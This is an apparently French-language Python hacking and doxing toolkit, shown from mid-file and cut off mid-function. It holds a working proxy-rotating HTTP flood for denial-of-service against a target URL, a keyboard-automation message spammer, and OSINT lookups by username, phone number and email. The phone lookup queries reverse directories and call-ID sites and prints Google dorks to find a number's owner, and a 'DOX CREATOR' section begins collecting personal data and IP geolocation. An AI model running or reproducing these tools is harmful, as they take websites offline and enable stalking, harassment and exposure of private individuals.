                    text = await response.text()
                    proxies = []
                    for line in text.splitlines():
                        line = line.strip()
                        if not line or ":" not in line:
                            continue
                        parts = line.split(":")
                        if len(parts) != 2:
                            continue
                        ip, port = parts[0].strip(), parts[1].strip()
                        if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip):
                            continue
                        try:
                            p = int(port)
                            if 1 <= p <= 65535:
                                proxies.append(f"http://{ip}:{p}")
                        except ValueError:
                            continue
                    return proxies
            except Exception:
                return []

        async def test_proxy(self, session, proxy):
            try:
                start = time.time()
                async with session.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5, connect=3, sock_read=3),
                ) as resp:
                    if resp.status == 200:
                        await resp.read()
                        lat = round((time.time() - start) * 1000)
                        return (proxy, lat)
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                self.stats["reset"] += 1
                return None
            except Exception:
                return None
            return None

        async def get_valid_proxies(self):
            print(f"{YELLOW}[*] Scraping des sources proxies...{RESET}")
            connector = aiohttp.TCPConnector(
                ssl=False, limit=50, force_close=True, enable_cleanup_closed=True,
            )
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = [self.fetch_proxy_list(session, url) for url in proxy_sources]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                raw = []
                for r in results:
                    if isinstance(r, list):
                        raw.extend(r)
                raw = list(dict.fromkeys(raw))
                print(f"{GREEN}[+] {len(raw)} proxies bruts recuperes{RESET}")

                if not raw:
                    return []

                print(f"{WHITE}[*] Test des proxies (patience, ~60s)...{RESET}")
                sample = raw[:2000]
                print(f"{WHITE}[*] Test de {len(sample)} proxies (max 2000)...{RESET}")

                valid = []
                valid_lock = asyncio.Lock()
                tested = {"count": 0}

                async def test_and_collect(p):
                    result = await self.test_proxy(session, p)
                    async with valid_lock:
                        tested["count"] += 1
                        if result:
                            valid.append(result[0])
                        if tested["count"] % 25 == 0:
                            sys.stdout.write(
                                f"\r{GREEN}[+] {tested['count']}/{len(sample)} testes  |  "
                                f"{len(valid)} valides{RESET}    "
                            )
                            sys.stdout.flush()

                sem = asyncio.Semaphore(200)

                async def bounded_test(p):
                    async with sem:
                        await test_and_collect(p)

                await asyncio.gather(*[bounded_test(p) for p in sample], return_exceptions=True)
                print(f"\n{GREEN}[+] {len(valid)} proxies valides sur {len(sample)} testes{RESET}")
                return valid

        async def send_request(self, session, proxy):
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": random.choice(["text/html", "application/json", "*/*"]),
                "Accept-Language": random.choice(["en-US", "fr-FR", "de-DE"]),
                "Cache-Control": "no-cache",
                "Connection": random.choice(["keep-alive", "close"]),
                "Referer": random.choice(["https://google.com", "https://bing.com", self.target_url]),
            }
            try:
                async with session.get(
                    self.target_url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5, connect=2, sock_read=3),
                    allow_redirects=False,
                ) as response:
                    print(f"-> {self.target_url} | Proxy: {proxy} | Status: {response.status}")
                    self.stats["ok"] += 1
                    return True
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                self.stats["reset"] += 1
                self.stats["fail"] += 1
                return False
            except Exception:
                self.stats["fail"] += 1
                return False

        def pick_random_proxy(self):
            if not self.proxies:
                return None
            return random.choice(self.proxies)

        async def attack_worker(self, session, requests_per_worker):
            for _ in range(requests_per_worker):
                proxy = self.pick_random_proxy()
                if proxy is None:
                    await asyncio.sleep(0)
                    continue

                ok = await self.send_request(session, proxy)
                if not ok:
                    proxy2 = self.pick_random_proxy()
                    if proxy2 and proxy2 != proxy:
                        ok = await self.send_request(session, proxy2)

                await asyncio.sleep(0)

        async def attack(self):
            valid = await self.get_valid_proxies()
            if not valid:
                print(f"{RED}[!] Aucun proxy valide — flood annule.{RESET}")
                return

            self.proxies = valid
            print(f"{GREEN}[+] Flood avec {len(self.proxies)} proxies actifs{RESET}\n")

            rpw = max(1, self.num_requests // self.max_concurrent)

            async def worker():
                connector = aiohttp.TCPConnector(
                    ssl=False,
                    limit=20,
                    limit_per_host=20,
                    force_close=True,
                    enable_cleanup_closed=True,
                )
                timeout = aiohttp.ClientTimeout(total=6, connect=3, sock_read=3)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    await self.attack_worker(session, rpw)

            start = time.time()
            tasks = [worker() for _ in range(self.max_concurrent)]
            await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.time() - start
            print(f"\n{GREEN}[+] Attack finished in {elapsed:.2f}s.{RESET}")
            print(f"{CYAN}[i] Stats -> OK: {self.stats['ok']} | Fail: {self.stats['fail']} | Reset: {self.stats['reset']}{RESET}")

        def run(self):
            try:
                asyncio.run(self.attack())
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Interrompu.{RESET}")
            except Exception as e:
                print(f"\n{RED}[!] Erreur : {e}{RESET}")

    print(f"\n{YELLOW}[*] Attack started...{RESET}\n")
    CliAttacker(target_url, num_requests).run()
    pause()


def option_2():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    def random_user_agent():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/153 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/142.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/153 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ]
        return random.choice(agents)

    username = input(f"{CYAN}[?] Username {RED}->{RESET} ").strip()
    if not username:
        print(f"{RED}[!] Username vide.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[...] Tracking '{username}'...{RESET}\n")

    SITES = [
        ("Instagram",     f"https://www.instagram.com/{username}/",         ["Sorry, this page isn't available", "Page Not Found"]),
        ("TikTok",        f"https://www.tiktok.com/@{username}",            ["Couldn't find this account", "Page not available"]),
        ("X",             f"https://x.com/{username}",                      ["This account doesn't exist", "Hmm...this page doesn't exist"]),
        ("YouTube",       f"https://www.youtube.com/@{username}",           ["This page isn't available", "404 Not Found"]),
        ("Facebook",      f"https://www.facebook.com/{username}",           ["content isn't available", "page isn't available"]),
        ("Snapchat",      f"https://www.snapchat.com/add/{username}",       ["This content could not be found"]),
        ("Pinterest",     f"https://www.pinterest.com/{username}/",         ["User not found"]),
        ("Reddit",        f"https://www.reddit.com/user/{username}",        ["Sorry, nobody on Reddit goes by that name", "page not found"]),
        ("Tumblr",        f"https://{username}.tumblr.com",                 ["There's nothing here", "not found"]),
        ("Twitch",        f"https://www.twitch.tv/{username}",              ["Sorry. Unless you've got a time machine"]),
        ("Threads",       f"https://www.threads.net/@{username}",           ["Sorry, this page isn't available"]),
        ("Bluesky",       f"https://bsky.app/profile/{username}.bsky.social", ["Profile not found"]),
        ("Mastodon",      f"https://mastodon.social/@{username}",           ["doesn't exist", "not found"]),
        ("LinkedIn",      f"https://www.linkedin.com/in/{username}/",       ["Page not found", "profile is not available"]),
        ("GitHub",        f"https://github.com/{username}",                 ["Not Found"]),
        ("GitLab",        f"https://gitlab.com/{username}",                 ["Not Found", "404"]),
        ("Bitbucket",     f"https://bitbucket.org/{username}/",             ["Not Found", "404"]),
        ("Codeberg",      f"https://codeberg.org/{username}",               ["Not Found"]),
        ("SourceForge",   f"https://sourceforge.net/u/{username}/profile",  ["Not Found"]),
        ("StackOverflow", f"https://stackoverflow.com/users/{username}",    ["Page not found", "User not found"]),
        ("Dev.to",        f"https://dev.to/{username}",                     ["Not Found", "404"]),
        ("Hashnode",      f"https://hashnode.com/@{username}",              ["Not Found"]),
        ("Medium",        f"https://medium.com/@{username}",                ["Out of nothing, something", "404"]),
        ("Substack",      f"https://{username}.substack.com",               ["Not Found", "404"]),
        ("Replit",        f"https://replit.com/@{username}",                ["Not Found"]),
        ("Codepen",       f"https://codepen.io/{username}",                 ["Not Found", "404"]),
        ("JSFiddle",      f"https://jsfiddle.net/user/{username}/",         ["Not Found"]),
        ("Kaggle",        f"https://www.kaggle.com/{username}",             ["Not Found", "404"]),
        ("HackerRank",    f"https://www.hackerrank.com/profile/{username}", ["Not Found", "404"]),
        ("LeetCode",      f"https://leetcode.com/{username}/",              ["Not Found", "404"]),
        ("Codeforces",    f"https://codeforces.com/profile/{username}",     ["not found", "404"]),
        ("TryHackMe",     f"https://tryhackme.com/p/{username}",            ["Not Found", "404"]),
        ("HackTheBox",    f"https://app.hackthebox.com/profile/{username}", ["Not Found"]),
        ("Steam",         f"https://steamcommunity.com/id/{username}",      ["The specified profile could not be found"]),
        ("Roblox",        f"https://www.roblox.com/user.aspx?username={username}", ["Page cannot be found"]),
        ("Xbox",          f"https://xboxgamertag.com/search/{username}",    ["Gamertag not found"]),
        ("PSN",           f"https://psnprofiles.com/{username}",            ["not found", "404"]),
        ("Faceit",        f"https://www.faceit.com/en/players/{username}",  ["Player not found"]),
        ("Patreon",       f"https://www.patreon.com/{username}",            ["Not Found", "404"]),
        ("Ko-fi",         f"https://ko-fi.com/{username}",                  ["Not Found"]),
        ("BuyMeACoffee",  f"https://www.buymeacoffee.com/{username}",       ["Not Found"]),
        ("Linktree",      f"https://linktr.ee/{username}",                  ["Not Found", "404"]),
        ("Beacons",       f"https://beacons.ai/{username}",                 ["Not Found"]),
        ("Carrd",         f"https://{username}.carrd.co",                   ["Not Found"]),
        ("About.me",      f"https://about.me/{username}",                   ["Not Found"]),
        ("SoundCloud",    f"https://soundcloud.com/{username}",             ["We can't find that user", "404"]),
        ("Spotify",       f"https://open.spotify.com/user/{username}",      ["Page not found"]),
        ("Bandcamp",      f"https://bandcamp.com/{username}",               ["Sorry, that something isn't here"]),
        ("Lastfm",        f"https://www.last.fm/user/{username}",           ["User not found"]),
        ("Mixcloud",      f"https://www.mixcloud.com/{username}/",          ["Page not found"]),
        ("DeviantArt",    f"https://www.deviantart.com/{username}",         ["Page Not Found"]),
        ("ArtStation",    f"https://www.artstation.com/{username}",         ["Page not found"]),
        ("Behance",       f"https://www.behance.net/{username}",            ["Page not found"]),
        ("Dribbble",      f"https://dribbble.com/{username}",               ["Page not found"]),
        ("Flickr",        f"https://www.flickr.com/people/{username}",      ["Page Not Found"]),
        ("Imgur",         f"https://imgur.com/user/{username}",             ["Not Found", "404"]),
        ("Disqus",        f"https://disqus.com/by/{username}/",             ["Not Found"]),
        ("Quora",         f"https://www.quora.com/profile/{username}",      ["Page Not Found"]),
        ("ProductHunt",   f"https://www.producthunt.com/@{username}",       ["Not Found"]),
        ("HackerNews",    f"https://news.ycombinator.com/user?id={username}", ["No such user"]),
        ("Keybase",       f"https://keybase.io/{username}",                 ["not found", "404"]),
        ("Wattpad",       f"https://www.wattpad.com/user/{username}",       ["Not Found"]),
        ("WebMii",        f"https://webmii.com/people?n={username}",        ["No results", "aucun résultat", "not found"]),
        ("Pappers",       f"https://www.pappers.fr/recherche?q={username}", ["Aucun résultat", "no result"]),
        ("Societe.com",   f"https://www.societe.com/cgi-bin/search?champs={username}", ["Aucun résultat"]),
        ("PagesJaunes",   f"https://www.pagesjaunes.fr/annuaire/chercherlespros?quoiqui={username}", ["Aucun résultat"]),
        ("Copainsdavant", f"https://copainsdavant.linternaute.com/recherche?q={username}", ["Aucun résultat"]),
        ("Skyrock",       f"https://{username}.skyrock.com",                ["n'existe pas", "not found", "404"]),
        ("Over-Blog",     f"https://{username}.over-blog.com",              ["not found", "404"]),
        ("Canalblog",     f"https://{username}.canalblog.com",              ["not found", "404"]),
        ("Eklablog",      f"https://{username}.eklablog.com",               ["not found", "404"]),
        ("JeuxVideo.com", f"https://www.jeuxvideo.com/profil/{username}",   ["n'existe pas", "404"]),
        ("Doctissimo",    f"https://forum.doctissimo.fr/membre/{username}", ["n'existe pas", "404"]),
        ("Aufeminin",     f"https://www.aufeminin.com/membre/{username}",   ["n'existe pas", "404"]),
        ("BlaBlaCar",     f"https://www.blablacar.fr/user/{username}",      ["n'existe pas", "not found"]),
        ("Leboncoin",     f"https://www.leboncoin.fr/profil/{username}",    ["n'existe pas", "404"]),
        ("Vinted",        f"https://www.vinted.fr/member/{username}",       ["Page introuvable", "404"]),
        ("Dailymotion",   f"https://www.dailymotion.com/{username}",        ["Not Found", "404"]),
        ("Deezer",        f"https://www.deezer.com/fr/profile/{username}",  ["not found", "404"]),
        ("Marmiton",      f"https://www.marmiton.org/membres/{username}",   ["not found", "404"]),
    ]

    found = []
    not_found = []
    errors = []
    lock = threading.Lock()
    semaphore = threading.Semaphore(30)

    def check_site(site, url, nf_markers):
        with semaphore:
            try:
                r = requests.get(
                    url,
                    headers={
                        "User-Agent": random_user_agent(),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                    },
                    timeout=8,
                    allow_redirects=True,
                )
                body = r.text[:20000] if r.text else ""

                is_nf = False
                for marker in nf_markers:
                    if marker.lower() in body.lower():
                        is_nf = True
                        break

                if r.status_code == 404 or is_nf:
                    with lock:
                        not_found.append(site)
                        print(f"{GRAY}[-] {site:<16} : Not found{RESET}")
                    return

                if r.status_code == 200:
                    with lock:
                        found.append((site, url))
                        print(f"{GREEN}[+] {site:<16} : {url}{RESET}")
                    return

                if r.status_code in (301, 302, 307, 308):
                    with lock:
                        found.append((site, url))
                        print(f"{GREEN}[+] {site:<16} : {url} (redirect){RESET}")
                    return

                with lock:
                    errors.append(site)
                    print(f"{YELLOW}[!] {site:<16} : HTTP {r.status_code}{RESET}")

            except requests.exceptions.Timeout:
                with lock:
                    errors.append(site)
                    print(f"{YELLOW}[!] {site:<16} : Timeout{RESET}")
            except requests.exceptions.ConnectionError:
                with lock:
                    errors.append(site)
                    print(f"{RED}[!] {site:<16} : Connection error{RESET}")
            except Exception:
                with lock:
                    errors.append(site)

    threads = []
    for site, url, nf in SITES:
        t = threading.Thread(target=check_site, args=(site, url, nf), daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    print("\n" + "=" * 60)
    print(f"{CYAN}   RESUME POUR '{username}'{RESET}")
    print("=" * 60)
    print(f"{GREEN}[+] Comptes trouves  : {len(found)}{RESET}")
    print(f"{GRAY}[-] Non trouves     : {len(not_found)}{RESET}")
    print(f"{YELLOW}[!] Erreurs         : {len(errors)}{RESET}")
    print(f"{WHITE}[i] Sites testes    : {len(SITES)}{RESET}")

    if found:
        print(f"\n{GREEN}--- COMPTES CONFIRMES ---{RESET}")
        for site, url in found:
            print(f"{GREEN}  [+] {site:<16}{RESET} {url}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "UsernameTracker"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"{username}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Username: {username}\n")
            f.write(f"Sites testes: {len(SITES)}\n")
            f.write(f"Trouves: {len(found)} | Non trouves: {len(not_found)} | Erreurs: {len(errors)}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[COMPTES TROUVES]\n")
            for site, url in found:
                f.write(f"  [+] {site:<16} {url}\n")
        print(f"\n{GREEN}[+] Resultats sauvegardes : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()


def option_3():
    clear()
    banner()

    try:
        import pyautogui
    except ImportError:
        print(f"{RED}[!] Module 'pyautogui' manquant. pip install pyautogui{RESET}")
        pause()
        return

    print(f"\n{CYAN}   [ TEXT BOMBER ]{RESET}\n")
    print(f"{GRAY}  Place ton curseur sur la zone de texte cible une fois lance.{RESET}")
    print(f"{GRAY}  Pour arreter : bouge la souris dans un coin de l'ecran.{RESET}\n")

    # 1. Le texte
    text = input(f"{YELLOW}[?]{RESET} Message a envoyer -> ")
    if not text:
        print(f"{RED}[!] Message vide.{RESET}")
        pause()
        return

    # 2. Le délai (T)
    try:
        delay = float(input(f"{YELLOW}[?]{RESET} Delai entre chaque message (en sec, 0 pour instant) -> ").strip() or "0")
        if delay < 0:
            delay = 0
    except ValueError:
        delay = 0

    # 3. Le nombre d'envois (Time)
    try:
        count = int(input(f"{YELLOW}[?]{RESET} Nombre de fois a envoyer -> ").strip())
        if count <= 0:
            raise ValueError()
    except ValueError:
        print(f"{RED}[!] Nombre invalide.{RESET}")
        pause()
        return

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"  {GREEN}Message : {WHITE}{text}{RESET}")
    print(f"  {GREEN}Delai   : {WHITE}{delay}s{RESET}")
    print(f"  {GREEN}Envois  : {WHITE}{count}{RESET}")
    print()

    confirm = input(f"{YELLOW}[?]{RESET} Lancer ? (y/n) -> ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[*] Lancement dans 3 secondes...{RESET}")
    for i in range(3, 0, -1):
        sys.stdout.write(f"\r{YELLOW}[*] Debut dans {i}...{RESET}    ")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()

    # Configuration PyAutoGUI
    pyautogui.FAILSAFE = True
    pyautogui.PAUSE = 0

    sent = 0
    start_time = time.time()

    try:
        # Boucle exacte de ton script
        while sent < count:
            if delay > 0:
                time.sleep(delay)
            
            pyautogui.typewrite(text)
            pyautogui.press("enter")
            sent += 1

            # Affichage minimaliste
            elapsed = time.time() - start_time
            rps = sent / elapsed if elapsed > 0 else 0
            sys.stdout.write(
                f"\r{GREEN}[+] {sent}/{count} envoyes{RESET} | "
                f"{CYAN}{rps:.1f} msg/s{RESET}    "
            )
            sys.stdout.flush()

    except pyautogui.FailSafeException:
        print(f"\n\n{YELLOW}[!] Fail-safe declenche (souris dans un coin). Arret.{RESET}")
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Ctrl+C — arret.{RESET}")
    except Exception as e:
        print(f"\n\n{RED}[!] Erreur : {e}{RESET}")

    total_time = time.time() - start_time
    print(f"\n\n{GREEN}[+] Termine{RESET}")
    print(f"  {GREEN}Envoyes : {WHITE}{sent}{RESET}")
    print(f"  {GREEN}Duree   : {WHITE}{total_time:.2f}s{RESET}")
    
    pause()

def option_4():
    clear()
    banner()
    if not _need_phonenumbers() or not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ PHONE INFO ]{RESET}")
    print(f"{GRAY}Format international, exemple : +33612345678{RESET}\n")

    phone = input(f"{CYAN}[?] Numero {RED}->{RESET} ").strip()
    if not phone:
        print(f"{RED}[!] Aucun numero.{RESET}")
        pause()
        return

    try:
        parsed = phonenumbers.parse(phone, None)
    except phonenumbers.NumberParseException as e:
        print(f"{RED}[!] Format invalide : {e}{RESET}")
        pause()
        return

    if not phonenumbers.is_possible_number(parsed):
        print(f"{RED}[!] Numero non possible.{RESET}")
        pause()
        return

    valid = phonenumbers.is_valid_number(parsed)
    country = geocoder.description_for_number(parsed, "fr") or "Inconnu"
    operator = carrier.name_for_number(parsed, "fr") or "Inconnu"
    zones = timezone.time_zones_for_number(parsed)
    zones_str = ", ".join(zones) if zones else "Inconnue"

    intl = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    nat = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
    e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)

    type_map = {
        phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
        phonenumbers.PhoneNumberType.MOBILE: "Mobile",
        phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed / Mobile",
        phonenumbers.PhoneNumberType.TOLL_FREE: "Toll Free",
        phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
        phonenumbers.PhoneNumberType.VOIP: "VoIP",
        phonenumbers.PhoneNumberType.UNKNOWN: "Unknown",
    }
    ntype = type_map.get(phonenumbers.number_type(parsed), "Unknown")

    print(f"\n{RED}{BOLD}===== PHONE INFORMATION ====={RESET}")
    print(f"{GREEN}[+] International : {WHITE}{intl}{RESET}")
    print(f"{GREEN}[+] National      : {WHITE}{nat}{RESET}")
    print(f"{GREEN}[+] E164          : {WHITE}{e164}{RESET}")
    print(f"{GREEN}[+] Country       : {WHITE}{country}{RESET}")
    print(f"{GREEN}[+] Country Code  : {WHITE}+{parsed.country_code}{RESET}")
    print(f"{GREEN}[+] Number        : {WHITE}{parsed.national_number}{RESET}")
    print(f"{GREEN}[+] Carrier       : {WHITE}{operator}{RESET}")
    print(f"{GREEN}[+] Timezone      : {WHITE}{zones_str}{RESET}")
    print(f"{GREEN}[+] Type          : {WHITE}{ntype}{RESET}")
    print(f"{GREEN}[+] Valid         : {WHITE}{valid}{RESET}")
    print(f"{RED}{BOLD}=============================={RESET}")

    print(f"\n{YELLOW}[*] Recherche dans les annuaires publics...{RESET}")

    national = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
    clean_num = re.sub(r"[^\d]", "", national)

    directory_sources = [
        ("118712.fr",        f"https://www.118712.fr/recherche?q={clean_num}",              ["Aucun résultat", "Pas de résultat", "aucune correspondance"]),
        ("PagesJaunes",      f"https://www.pagesjaunes.fr/annuaireinverse/{clean_num}",     ["Aucun résultat", "Aucune société", "Désolé"]),
        ("PagesBlanches",    f"https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui={clean_num}", ["Aucun résultat", "Aucun abonné"]),
        ("Infobel FR",       f"https://www.infobel.com/fr/france/reverse/{clean_num}",      ["No results", "Aucun résultat"]),
        ("Annuaire-Inverse", f"https://annuaire-inverse.net/recherche/{clean_num}",         ["Aucun résultat", "No result"]),
    ]

    directory_found = []
    dlock = threading.Lock()

    def check_directory(name, url, nf_markers):
        try:
            r = requests.get(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                    "Accept": "text/html,application/xhtml+xml",
                    "Accept-Language": "fr-FR,fr;q=0.9",
                },
                timeout=10,
                allow_redirects=True,
            )
            body = (r.text or "")[:30000].lower()

            is_nf = any(m.lower() in body for m in nf_markers)
            if r.status_code == 200 and not is_nf and len(body) > 2000:
                extracted = {"name": None}

                name_match = re.search(
                    r"(?:<h[1-3][^>]*>|<strong>|<b>)([A-ZÉÈÀÂÎÔÛÇ][a-zéèàâîôûç]+(?:\s+[A-ZÉÈÀÂÎÔÛÇ][a-zéèàâîôûç\-]+){1,3})(?:</h[1-3]>|</strong>|</b>)",
                    r.text or "",
                )
                if name_match:
                    extracted["name"] = name_match.group(1).strip()

                with dlock:
                    directory_found.append({
                        "source": name,
                        "url": url,
                        "name": extracted["name"],
                    })
                    if extracted["name"]:
                        print(f"{GREEN}[+] {name:<18} : {extracted['name']}{RESET}")
                    else:
                        print(f"{YELLOW}[+] {name:<18} : resultat brut disponible{RESET}")
                        print(f"{GRAY}    {url}{RESET}")
        except Exception:
            pass

    dthreads = []
    for name, url, nf in directory_sources:
        t = threading.Thread(target=check_directory, args=(name, url, nf), daemon=True)
        dthreads.append(t)
        t.start()
    for t in dthreads:
        t.join()

    if not directory_found:
        print(f"{GRAY}[-] Aucun resultat dans les annuaires publics.{RESET}")
        if ntype in ("Mobile", "VoIP"):
            print(f"{YELLOW}[i] Normal pour un mobile — les mobiles ne sont pas dans les annuaires FR (RGPD).{RESET}")

    print(f"\n{YELLOW}[*] Tentative sur les bases call-ID...{RESET}")

    call_id_sources = [
        ("Truecaller",  f"https://www.truecaller.com/search/fr/{clean_num}",  ["No results", "not found", "No one has"]),
        ("Sync.me",     f"https://sync.me/search/?number={clean_num}",       ["No results", "not found", "We couldn't find"]),
    ]

    call_id_found = []
    clock = threading.Lock()

    def check_call_id(name, url, nf_markers):
        try:
            r = requests.get(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                    "Accept": "text/html,application/xhtml+xml",
                    "Accept-Language": "fr-FR,fr;q=0.9",
                },
                timeout=10,
                allow_redirects=True,
            )
            body = (r.text or "")[:30000].lower()
            is_nf = any(m.lower() in body for m in nf_markers)
            if r.status_code == 200 and not is_nf and len(body) > 1000:
                with clock:
                    call_id_found.append({"source": name, "url": url})
                    print(f"{GREEN}[+] {name:<18} : resultat disponible{RESET}")
                    print(f"{GRAY}    {url}{RESET}")
        except Exception:
            pass

    cthreads = []
    for name, url, nf in call_id_sources:
        t = threading.Thread(target=check_call_id, args=(name, url, nf), daemon=True)
        cthreads.append(t)
        t.start()
    for t in cthreads:
        t.join()

    if not call_id_found:
        print(f"{GRAY}[-] Aucun resultat call-ID.{RESET}")

    print(f"\n{YELLOW}[*] Google dork (recherche de fuites publiques)...{RESET}")
    dorks = [
        f'"{national}"',
        f'"{e164}"',
        f'"{intl}"',
    ]
    print(f"{GRAY}[i] Ouvre ces recherches dans ton navigateur :{RESET}")
    for d in dorks:
        google_url = f"https://www.google.com/search?q={urllib.parse.quote(d)}"
        print(f"{GRAY}    {google_url}{RESET}")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"{GREEN}[+] Annuaire public  : {len(directory_found)} source(s){RESET}")
    print(f"{GREEN}[+] Call-ID          : {len(call_id_found)} source(s){RESET}")
    if ntype in ("Mobile", "VoIP"):
        print(f"{YELLOW}[i] Numero mobile — les annuaires FR ne le listeront pas (loi RGPD).{RESET}")
    else:
        print(f"{GREEN}[i] Numero fixe/pro — les annuaires sont la bonne source.{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "PhoneInfo"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_num = re.sub(r"[^\d+]", "", phone)
        out_file = out_dir / f"{safe_num}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Numero: {phone}\n")
            f.write(f"International: {intl}\n")
            f.write(f"National: {nat}\n")
            f.write(f"E164: {e164}\n")
            f.write(f"Pays: {country}\n")
            f.write(f"Operateur: {operator}\n")
            f.write(f"Type: {ntype}\n")
            f.write(f"Valide: {valid}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[ANNUAIRES PUBLICS]\n")
            for d in directory_found:
                f.write(f"  {d['source']:<18} {d['url']}\n")
                if d.get("name"):
                    f.write(f"    Nom detecte: {d['name']}\n")
            f.write("\n[CALL-ID]\n")
            for c in call_id_found:
                f.write(f"  {c['source']:<18} {c['url']}\n")
        print(f"\n{GREEN}[+] Resultats sauvegardes : {out_file}{RESET}")
    except Exception:
        pass

    pause()


def option_5():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    email = input(f"{YELLOW}[?]{RESET} Email {RED}->{RESET} ").strip()
    if not email or "@" not in email or "." not in email:
        print(f"{RED}[!] Email invalide.{RESET}")
        pause()
        return

    print(f"{CYAN}[*] Checking...{RESET}\n")

    def join_any(seq, limit=10):
        if not seq or not isinstance(seq, list):
            return "None"
        parts = []
        for item in seq[:limit]:
            if isinstance(item, str):
                parts.append(item)
            elif isinstance(item, dict):
                parts.append(str(next((v for v in item.values() if v), "Unknown")))
            else:
                parts.append(str(item))
        return ", ".join(parts) + (" ..." if len(seq) > limit else "")

    def check_leakcheck(mail):
        enc = urllib.parse.quote(mail, safe="")
        url = "https://leakcheck.io/api/public?check=" + enc
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 429:
                print(f"{YELLOW}[!] LeakCheck rate limite.{RESET}")
                time.sleep(1.5)
                return None
            data = r.json() if r.status_code == 200 else None
            if data and data.get("success") and data.get("found", 0) > 0:
                return {
                    "source": "LeakCheck.io",
                    "found": data.get("found", 0),
                    "fields": join_any(data.get("fields", [])),
                    "sources": join_any(data.get("sources", [])),
                }
        except Exception:
            pass
        return None

    def check_xposedornot(mail):
        enc = urllib.parse.quote(mail, safe="")
        url = "https://xposedornot.com/v1/check-email/" + enc
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                breaches = data.get("ExposedRecords") or data.get("breaches") or []
                if breaches:
                    names = []
                    for b in breaches:
                        if isinstance(b, dict):
                            names.append(
                                b.get("breach")
                                or b.get("name")
                                or next(iter(b.values()), "Unknown")
                            )
                        elif isinstance(b, str):
                            names.append(b)
                    if names:
                        return {
                            "source": "XposedOrNot",
                            "found": len(names),
                            "fields": join_any(names),
                            "sources": "XposedOrNot Database",
                        }
        except Exception:
            pass
        return None

    results = []
    for checker in (check_leakcheck, check_xposedornot):
        r = checker(email)
        if r:
            results.append(r)
        time.sleep(1.1)

    if results:
        total = sum(r["found"] for r in results)
        print(f"{RED}[!] Trouve dans {total} breaches sur {len(results)} sources.{RESET}\n")
        for r in results:
            print(f"{GREEN}[+] Source  : {r['source']}{RESET}")
            print(f"{GREEN}[+] Found   : {r['found']}{RESET}")
            print(f"{GREEN}[+] Fields  : {r['fields']}{RESET}")
            print(f"{GREEN}[+] Sources : {r['sources']}{RESET}\n")
    else:
        print(f"{GREEN}[+] Aucune breach trouvee.{RESET}")
    pause()


def option_6():
    clear()
    banner()

    print(f"\n{CYAN}   [ DOX CREATOR ]{RESET}\n")
    print(f"{GRAY}Tape ENTREE pour passer un champ (il sera marque 'None').{RESET}\n")

    def Ask(label):
        return input(f"{YELLOW}[?]{RESET} {label} {RED}->{RESET} ").strip() or "None"

    def LookupIp(ip):
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
                timeout=10
            )
            data = r.json()
            if data.get("status") == "success":
                return data
        except Exception:
            pass
        return {}

    def LookupPhone(phone):
        try:
            import phonenumbers
            from phonenumbers import geocoder, carrier, timezone as tz
            parsed = phonenumbers.parse(phone)
